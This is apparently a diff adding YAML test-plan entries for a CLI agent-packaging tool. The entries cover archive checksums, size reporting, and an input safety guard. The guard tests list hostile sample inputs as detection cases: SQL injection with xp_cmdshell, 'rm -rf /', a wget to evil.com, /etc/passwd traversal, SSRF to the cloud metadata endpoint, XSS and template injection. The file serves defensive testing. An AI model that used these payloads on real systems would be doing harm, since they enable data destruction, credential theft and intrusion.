+      - step1: Run `kinnoo install <archive.kno>`
+      - step2: Verify checksum verification step succeeds
+      - step3: Verify extraction/install continues successfully
+    expected: Install validates checksum before extraction and proceeds on match
+    pass_criteria: Install completes successfully and verification output indicates checksum match
+    automated: true
+    automation_path: tests/test_archive_integrity.py::test_install_verifies_checksum_when_present
+    covers:
+      - feature: feature16
+        ac: AC2
+
+  - id: test139
+    title: install aborts on checksum mismatch with integrity error
+    type: integration
+    preconditions: "`.kno` archive and intentionally incorrect `.kno.sha256` sidecar exist"
+    steps:
+      - step1: Run `kinnoo install <archive.kno>`
+      - step2: Capture output and exit code
+      - step3: Verify extraction does not proceed after failed integrity check
+    expected: Install aborts with explicit archive integrity failure message
+    pass_criteria: "Non-zero exit and output contains `Archive integrity check failed — the file may be corrupted or tampered with`"
+    automated: true
+    automation_path: tests/test_archive_integrity.py::test_install_aborts_on_checksum_mismatch
+    covers:
+      - feature: feature16
+        ac: AC3
+
+  - id: test140
+    title: install warns and proceeds when checksum file is absent
+    type: integration
+    preconditions: "`.kno` archive exists without sibling `.kno.sha256` sidecar"
+    steps:
+      - step1: Run `kinnoo install <archive.kno>`
+      - step2: Verify warning about missing checksum is printed
+      - step3: Verify install proceeds through normal extraction path
+    expected: Missing checksum produces warning-only behavior with no hard failure
+    pass_criteria: "Output includes `No checksum file found — archive integrity not verified` and install succeeds"
+    automated: true
+    automation_path: tests/test_archive_integrity.py::test_install_warns_when_checksum_missing
+    covers:
+      - feature: feature16
+        ac: AC4
+
+  - id: test141
+    title: inspect displays archive checksum when available
+    type: integration
+    preconditions: "`.kno` archive has sibling `.kno.sha256` sidecar"
+    steps:
+      - step1: Run `kinnoo inspect <archive.kno>`
+      - step2: Verify output includes checksum field/value
+      - step3: Verify displayed checksum matches sidecar digest
+    expected: Inspect output includes archive integrity checksum metadata
+    pass_criteria: Inspect output contains checksum label and digest matching sidecar
+    automated: true
+    automation_path: tests/test_archive_integrity.py::test_inspect_displays_checksum_for_archive_with_sidecar
+    covers:
+      - feature: feature16
+        ac: AC6
+
+  - id: test142
+    title: publish includes checksum sidecar when present
+    type: integration
+    preconditions: "local archive contains `.kno` with matching `.kno.sha256` sidecar"
+    steps:
+      - step1: Run `kinnoo publish <agent-name>`
+      - step2: Verify published registry target includes `.kno` artifact
+      - step3: Verify matching `.kno.sha256` sidecar is also published
+    expected: Publish propagates checksum sidecar with archive when available
+    pass_criteria: Registry destination contains both archive and sidecar for published version
+    automated: true
+    automation_path: tests/test_archive_integrity.py::test_publish_copies_checksum_sidecar_when_present
+    covers:
+      - feature: feature16
+        ac: AC7
+
+  - id: test143
+    title: docs cover archive integrity checksum lifecycle
+    type: unit
+    preconditions: README.md and docs/manifest-schema-reference.md are present and readable
+    steps:
+      - step1: Verify docs describe `.kno.sha256` generation during pack
+      - step2: Verify docs describe install behavior for present, mismatched, and missing checksums
+      - step3: Verify docs describe inspect checksum display and publish sidecar behavior
+    expected: Documentation reflects feature16 checksum lifecycle across key commands
+    pass_criteria: Required checksum lifecycle statements are present and consistent across docs
+    automated: true
+    automation_path: tests/test_docs.py::test_feature16_docs_cover_checksum_lifecycle
+    covers:
+
+  - id: test144
+    title: pack prints final archive size in human-readable form
+    type: integration
+    preconditions: valid agent directory and runnable `kinnoo pack`
+    steps:
+      - step1: Run `kinnoo pack <agent-dir>`
+      - step2: Capture command output
+      - 'step3: Verify output contains `Archive size: <value>` with B/KB/MB units'
+    expected: Pack always reports final archive size in human-readable format
+    pass_criteria: Output includes archive size line with deterministic unit formatting
+    automated: true
+    automation_path: tests/test_pack_size_reporting.py::test_pack_prints_human_readable_archive_size
+    covers:
+      - feature: feature17
+        ac: AC1
+
+  - id: test145
+    title: pack warns when archive size exceeds warning threshold
+    type: integration
+    preconditions: threshold override supported for tests; fixture can produce archive over override threshold
+    steps:
+      - step1: Set test threshold override (for example `KINNOO_PACK_WARN_THRESHOLD_MB=1`)
+      - step2: Create fixture with incompressible payload large enough to exceed override threshold
+      - step3: Run `kinnoo pack <agent-dir>` and capture output
+      - 'step4: Verify warning `Warning: archive is large (X MB). Consider whether all dependencies are necessary.` is printed'
+    expected: Warning branch is triggered when final archive size exceeds threshold
+    pass_criteria: Pack output includes large-archive warning with computed MB value
+    automated: true
+    automation_path: tests/test_pack_size_reporting.py::test_pack_warns_when_archive_exceeds_threshold_override
+    covers:
+      - feature: feature17
+        ac: AC2
+
+  - id: test146
+    title: inspect displays archive size for .kno target
+    type: integration
+    preconditions: valid `.kno` archive available for inspect
+    steps:
+      - step1: Run `kinnoo inspect <archive.kno>`
+      - step2: Verify output contains archive size metadata line
+      - step3: Verify reported size matches archive byte size converted to display format
+    expected: Inspect output includes archive size visibility for packaged artifacts
+    pass_criteria: "`- Archive Size: <value>` appears and is consistent with archive file size"
+    automated: true
+    automation_path: tests/test_pack_size_reporting.py::test_inspect_displays_archive_size_for_archive_target
+    covers:
+      - feature: feature17
+        ac: AC3
+
+  - id: test147
+    title: list includes archive size in local and remote modes
+    type: integration
+    preconditions: local archive and mock registry include at least one agent artifact with known size
+    steps:
+      - step1: Run `kinnoo list` and `kinnoo list --local`; verify size field appears
+      - step2: Run `kinnoo list --remote`; verify size field appears for remote rows
+      - step3: Verify size values are human-readable and stable across modes
+    expected: List output exposes archive size for install-time visibility in all supported modes
+    pass_criteria: Local and remote list outputs both include archive size column/field with valid values
+    automated: true
+    automation_path: tests/test_pack_size_reporting.py::test_list_includes_archive_size
+    covers:
+      - feature: feature17
+        ac: AC4
+
+  - id: test148
+    title: docs cover pack size reporting and large-archive warnings
+    type: unit
+    preconditions: README.md and docs/manifest-schema-reference.md are present and readable
+    steps:
+      - 'step1: Verify docs describe `Archive size: <value>` output from pack'
+      - step2: Verify docs describe >100 MB warning behavior and message
+      - step3: Verify docs describe inspect/list archive size visibility
+    expected: Documentation reflects feature17 size-reporting behavior end-to-end
+    pass_criteria: Required feature17 size-reporting statements are present and consistent across docs
+    automated: true
+    automation_path: tests/test_docs.py::test_feature17_docs_cover_pack_size_reporting
+
+  - id: test149
+    title: InputGuardResult and InputWarning have correct structure
+    type: unit
+    preconditions: input_guard module available
+    steps:
+      - step1: Import InputGuardResult and InputWarning from kinnoo.input_guard
+      - step2: Create InputWarning with threat_category, description, and param_name fields
+      - step3: Create InputGuardResult with safe=True and empty warnings; verify fields
+      - step4: Create InputGuardResult with safe=False and a list of InputWarning; verify fields
+    expected: Both classes are constructible with expected fields and field types
+    pass_criteria: InputWarning has threat_category (str), description (str), param_name (str|None); InputGuardResult has safe (bool), warnings (list)
+    automated: true
+    automation_path: tests/test_input_guard.py::test_result_models_structure
+    covers:
+      - feature: feature18
+        ac: AC4
+
+  - id: test150
+    title: get_default_guard returns protocol-compatible instance
+    type: unit
+    preconditions: input_guard module available
+    steps:
+      - step1: Call get_default_guard()
+      - step2: Verify returned instance has check() method accepting (value, input_type)
+      - step3: Verify returned instance has check_inputs() method accepting list of tuples
+      - step4: Call check("safe text") and verify it returns InputGuardResult
+    expected: Factory returns an object satisfying the InputGuard protocol contract
+    pass_criteria: Instance has check and check_inputs methods; check returns InputGuardResult
+    automated: true
+    automation_path: tests/test_input_guard.py::test_get_default_guard_protocol_contract
+    covers:
+      - feature: feature18
+        ac: AC4
+
+  - id: test151
+    title: SQL injection patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test UNION SELECT variant (e.g., "' UNION SELECT * FROM users--")
+      - step2: Test DROP TABLE variant (e.g., "'; DROP TABLE users;--")
+      - step3: Test tautology variant (e.g., "' OR 1=1--")
+      - step4: Test INSERT INTO variant (e.g., "'; INSERT INTO users VALUES('admin','pw');--")
+      - step5: Test DELETE FROM variant (e.g., "'; DELETE FROM users;--")
+      - step6: Test WAITFOR DELAY variant (e.g., "'; WAITFOR DELAY '0:0:5';--")
+      - step7: Test EXEC xp_ variant (e.g., "'; EXEC xp_cmdshell('whoami');--")
+    expected: Each SQL injection variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category SQL_INJECTION
+    automated: true
+    automation_path: tests/test_input_guard.py::test_sql_injection_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test152
+    title: Shell injection patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test command chaining (e.g., "; rm -rf /")
+      - step2: Test command substitution $() (e.g., "$(cat /etc/passwd)")
+      - step3: Test backtick substitution (e.g., "`whoami`")
+      - step4: Test pipe to shell (e.g., "input | bash")
+      - step5: Test && chaining (e.g., "&& wget http://evil.com/payload")
+      - step6: Test null byte injection (e.g., "file.txt%00.jpg")
+    expected: Each shell injection variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category SHELL_INJECTION
+    automated: true
+    automation_path: tests/test_input_guard.py::test_shell_injection_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test153
+    title: Path traversal patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test basic traversal (e.g., "../../etc/passwd")
+      - step2: Test backslash traversal (e.g., "..\\..\\windows\\system32")
+      - step3: Test URL-encoded traversal (e.g., "%2e%2e%2fetc/passwd")
+      - step4: Test double-encoded traversal (e.g., "%252e%252e%252fetc/passwd")
+      - step5: Test absolute sensitive path (e.g., "/etc/passwd")
+    expected: Each path traversal variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category PATH_TRAVERSAL
+    automated: true
+    automation_path: tests/test_input_guard.py::test_path_traversal_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test154
+    title: SSRF patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test file:// protocol (e.g., "file:///etc/passwd")
+      - step2: Test gopher:// protocol (e.g., "gopher://127.0.0.1:25/")
+      - step3: Test dict:// protocol (e.g., "dict://localhost:11211/")
+      - step4: Test internal loopback IP (e.g., "http://127.0.0.1/admin")
+      - step5: Test private network IP (e.g., "http://10.0.0.1/internal")
+      - step6: Test AWS metadata endpoint (e.g., "http://169.254.169.254/latest/meta-data/")
+      - step7: Test localhost hostname (e.g., "http://localhost:8080/secret")
+    expected: Each SSRF variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category SSRF
+    automated: true
+    automation_path: tests/test_input_guard.py::test_ssrf_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test155
+    title: XSS patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test script tag (e.g., "<script>alert('xss')</script>")
+      - step2: Test javascript URI (e.g., "javascript:alert(1)")
+      - step3: Test event handler (e.g., '<img onerror="alert(1)" src=x>')
+      - step4: Test data URI (e.g., "data:text/html,<script>alert(1)</script>")
+    expected: Each XSS variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category XSS
+    automated: true
+    automation_path: tests/test_input_guard.py::test_xss_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test156
+    title: Template injection patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test Jinja2/Twig (e.g., "{{ 7*7 }}")
+      - step2: Test ERB (e.g., "<%= system('whoami') %>")
+      - step3: Test expression language (e.g., "${7*7}")
+    expected: Each template injection variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category TEMPLATE_INJECTION
+    automated: true
+    automation_path: tests/test_input_guard.py::test_template_injection_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test157
+    title: Legitimate/safe inputs pass without warnings
+    type: unit
+    preconditions: input_guard module available
+    steps:
+      - step1: Test normal conversational text (e.g., "Hello, how are you today?")
+      - step2: Test text with numbers and punctuation (e.g., "The price is $19.99 for 3 items.")
+      - step3: Test text mentioning technical terms benignly (e.g., "Tell me about SQL databases and SELECT queries")
+      - step4: Test text with forward slashes in non-traversal context (e.g., "The ratio is 3/4 of the total")
+      - step5: Test text with URLs to public hosts (e.g., "Check out https://example.com for details")
+    expected: All legitimate inputs pass the guard without warnings
+    pass_criteria: Each input returns safe=True with an empty warnings list
+    automated: true
+    automation_path: tests/test_input_guard.py::test_safe_inputs_pass_clean
+    covers:
+      - feature: feature18
+        ac: AC6
+
+  - id: test158
+    title: "Type-aware filtering: input_type restricts pattern categories"
+    type: unit
+    preconditions: input_guard module available
+    steps:
+      - 'step1: Call check("../../etc/passwd", "file_path") — expect PATH_TRAVERSAL detected'
+      - 'step2: Call check("'' OR 1=1--", "file_path") — expect safe=True (SQL patterns skipped for file_path type)'
+      - 'step3: Call check("http://169.254.169.254/", "url") — expect SSRF detected'
+      - 'step4: Call check("../../etc/passwd", "url") — expect safe=True (path traversal skipped for url type)'
+      - 'step5: Call check("'' UNION SELECT *--", "id") — expect SQL_INJECTION detected'
+      - 'step6: Call check("../../etc/passwd", "id") — expect safe=True (path traversal skipped for id type)'
+    expected: Each input_type activates only the appropriate pattern categories
+    pass_criteria: Type-filtered checks detect threats in their scope and pass on out-of-scope patterns
+    automated: true
+    automation_path: tests/test_input_guard.py::test_type_aware_filtering
+    covers:
+      - feature: feature18
+        ac: AC7
+
+  - id: test159
+    title: "check_inputs multi-value aggregation with param names"
+    type: unit
+    preconditions: input_guard module available
+    steps:
+      - 'step1: Call check_inputs with mix of safe and unsafe inputs: [("query", "'' OR 1=1--", "text"), ("path", "safe/file.txt", "file_path"), ("url", "http://169.254.169.254/", "url")]'
+      - step2: Verify result is safe=False
+      - step3: Verify warnings include param_name for each flagged input
+      - step4: Verify safe input ("path") does not appear in warnings
+      - 'step5: Call check_inputs with all-safe inputs and verify safe=True with empty warnings'
+    expected: Multi-value checking aggregates warnings per parameter and reports overall safety
+    pass_criteria: Aggregated result is safe only if all inputs are safe; each warning carries the correct param_name
+    automated: true
+    automation_path: tests/test_input_guard.py::test_check_inputs_multi_value_aggregation
+    covers:
+      - feature: feature18
+        ac: AC8
+
+  - id: test160
+    title: "--no-guard flag skips safety check entirely"
+    type: integration
+    preconditions: kinnoo CLI installed, valid agent directory
+    steps:
+      - step1: Create a valid agent directory with a simple entrypoint
+      - step2: Run `kinnoo run <agent-dir> "' OR 1=1--" --no-guard`
+      - step3: Verify the agent executes without any safety warning or prompt
+    expected: With --no-guard, malicious-looking input is passed directly to the agent
+    pass_criteria: Agent runs successfully; no "[kinnoo] Input safety warning" in output
+    automated: true
+    automation_path: tests/test_input_guard_integration.py::test_no_guard_flag_skips_check
+    covers:
+      - feature: feature18
+        ac: AC3
+
+  - id: test161
+    title: "Malicious input triggers warning; answering 'n' aborts"
+    type: integration
+    preconditions: kinnoo CLI installed, valid agent directory
+    steps:
+      - step1: Create a valid agent directory with a simple entrypoint
+      - step2: Run kinnoo run with malicious input (e.g., "'; DROP TABLE users;--") and simulate 'n' response to prompt
+      - step3: Verify "[kinnoo] Input safety warning:" appears in stderr
+      - step4: Verify the agent entrypoint was NOT executed (no agent output)
+      - step5: Verify exit code is non-zero
+    expected: Guard blocks execution after user rejects the warning
+    pass_criteria: Warning printed; agent not executed; exit code non-zero
+    automated: true
+    automation_path: tests/test_input_guard_integration.py::test_malicious_input_abort_on_reject
+    covers:
+      - feature: feature18
+        ac: AC2
+
+  - id: test162
+    title: "Malicious input triggers warning; answering 'y' proceeds"
+    type: integration
+    preconditions: kinnoo CLI installed, valid agent directory
+    steps:
+      - step1: Create a valid agent directory with a simple entrypoint that echoes input
+      - step2: Run kinnoo run with malicious input and simulate 'y' response to prompt
+      - step3: Verify "[kinnoo] Input safety warning:" appears in stderr
+      - step4: Verify the agent entrypoint WAS executed (agent output visible)
+    expected: Guard allows execution after user accepts the warning
+    pass_criteria: Warning printed; agent executed; agent output visible
+    automated: true
+    automation_path: tests/test_input_guard_integration.py::test_malicious_input_proceed_on_accept
+    covers:
+      - feature: feature18
+        ac: AC2
+      - feature: feature18
+        ac: AC6
+
+  - id: test163
+    title: "Non-interactive stdin with malicious input auto-aborts"
+    type: integration
+    preconditions: kinnoo CLI installed, valid agent directory
+    steps:
+      - step1: Create a valid agent directory with a simple entrypoint
+      - step2: Run kinnoo run with malicious input in non-interactive mode (pipe stdin or close stdin)
+      - step3: Verify warning is printed and execution is aborted without prompting
+      - step4: Verify exit code is non-zero
+    expected: In non-interactive mode, malicious input causes immediate abort (fail-safe)
+    pass_criteria: Warning printed; "Non-interactive mode" message in stderr; exit code non-zero
+    automated: true
+    automation_path: tests/test_input_guard_integration.py::test_non_interactive_auto_aborts
+    covers:
+      - feature: feature18
+        ac: AC2
+
+  - id: test164
+    title: docs cover input safety guard feature
+    type: unit
+    preconditions: README.md and docs/manifest-schema-reference.md are present and readable
+    steps:
+      - step1: Verify README.md describes the input safety guard and --no-guard flag
+      - step2: Verify README.md mentions the threat categories (SQL injection, shell injection, path traversal, SSRF, XSS, template injection)
+      - step3: Verify docs describe the pluggable Protocol-based design and type-aware checking
+    expected: Documentation reflects feature18 input safety guard behavior
+    pass_criteria: Required feature18 documentation statements are present in README.md and docs
+    automated: true
+    automation_path: tests/test_docs.py::test_feature18_docs_cover_input_safety_guard
+    covers:
+      - feature: feature18
+        ac: AC1
+
+  - id: test165
+    title: SQL comment markers in benign text do not trigger warnings
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Check benign text containing a hash marker (for example explanatory markdown or tags) and verify safe result
+      - step2: Check benign text containing double-hyphen punctuation and verify safe result
+      - step3: Verify no SQL_INJECTION warning is returned for these benign cases
+    expected: Benign text with `#` or `--` is not over-classified as SQL injection
+    pass_criteria: Guard returns safe=True and no SQL_INJECTION warnings for benign marker-only inputs
+    automated: true
+    automation_path: tests/test_input_guard.py::test_sql_comment_markers_benign_text_not_flagged
+    covers:
+      - feature: feature18
+        ac: AC6
+
+  - id: test166
+    title: SQL comment injection context remains detected after precision tuning
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Check quote-plus-comment payload (for example username quote followed by SQL comment marker)
+      - step2: Check SQL keyword plus comment payload (for example SELECT/UNION context followed by SQL comment marker)
+      - step3: Verify SQL_INJECTION warning is returned for contextual comment-injection payloads
+    expected: SQL comment injection patterns with SQL-like context are still detected
+    pass_criteria: Guard returns safe=False with SQL_INJECTION warnings for contextual comment-injection inputs
+    automated: true
+    automation_path: tests/test_input_guard.py::test_sql_comment_injection_context_still_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
